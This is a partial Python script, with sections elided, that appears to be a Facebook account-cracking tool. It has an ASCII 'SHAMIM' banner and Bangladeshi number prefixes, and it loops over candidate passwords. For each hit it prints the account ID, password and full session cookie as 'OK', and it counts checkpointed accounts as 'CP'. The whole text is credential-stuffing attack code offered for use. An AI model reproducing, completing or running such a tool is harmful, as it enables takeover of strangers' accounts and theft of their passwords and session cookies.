...
logo = (""""\033[132m
 SSS  H  H  AA  M   M III M   M 
S     H  H A  A MM MM  I  MM MM 
 SSS  HHHH AAAA M M M  I  M M M 
    S H  H A  A M   M  I  M   M 
SSSS  H  H A  A M   M III M   M  \033[1;37m\n""")
def ud():
    os.system('clear')
    jalan(logo)
...
def i():
    ...
    jalan('\033[1;32m ══════════════════════════════════════════════════════════')
    jalan('\033[1;36m  Bangladesh  CODES :  \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
    jalan('\033[1;32m ══════════════════════════════════════════════════════════')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[Shamim -OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[Shamim -CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(' %s[Shamim ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
